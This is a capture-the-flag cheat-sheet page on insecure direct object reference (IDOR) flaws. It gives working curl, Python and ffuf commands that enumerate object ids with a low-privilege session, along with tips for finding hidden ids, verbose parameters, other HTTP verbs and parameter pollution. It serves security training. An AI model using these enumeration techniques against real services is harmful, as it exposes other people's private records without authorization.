# IDOR — Insecure Direct Object Reference (CWE-639, OWASP API1)

**Signs**: you can see *your* object at `/note/2` / `/api/users/5` / `?id=1001`; ids are numeric,
short, sequential, or leaked elsewhere. Hint "some doors belong to others — try them anyway",
"profiles in a row, count them".

## Exploit
```bash
# log in as the low-priv user first (auth IS checked, ownership isn't)
curl -s -c j -d 'user=guest&pw=guest123' $T/login >/dev/null
for i in $(seq 0 60); do r=$(curl -s -b j $T/note/$i); echo "$i $(echo "$r" | wc -c) $(echo "$r" | grep -o 'flag{[^}]*}')"; done

# generic script (any URL with {} placeholder, cookie, range, grep)
python scripts/leak/idor_enum.py "$T/note/{}" -c 'session=...' --range 0-200
python scripts/leak/idor_enum.py "$T/api/users/{}?verbose=true" --range 1-100

# ffuf
seq 0 1000 > ids.txt; ffuf -u $T/api/users/FUZZ -w ids.txt -b 'session=...' -mc 200
```

## Where ids hide when not sequential
JS bundles (`ADMIN_PROFILE_ID = 7`), listing endpoints (`/api/users`), HTML `data-id`, other users'
public profiles, `.git`, error messages, UUIDv1 (time-based → predictable), hashed ids
(`md5(1)`, `md5(2)`…).

## Hidden fields / verbose switches
APIs often serialize the whole object when asked: try `?verbose=true`, `?debug=1`, `?full=1`,
`?fields=*`, `?include=all`, `?expand=*`, `?format=json`, `Accept: application/json`.
Fuzz names: [parameter-discovery](../01-recon/parameter-discovery.md).

## Also try
- Other verbs on the same object: `PUT/PATCH/DELETE /api/users/1`.
- Id in body/JSON instead of URL: `{"user_id": 1}`; arrays `{"id":[1,2]}`; `id=1&id=2` (HPP).
- Negative / zero / huge ids, `1.0`, `01`, `%20 1`.

Seen in: `notes1` (guest reads admin's note 3), `leak5` (admin id in JS + `?verbose=true`).
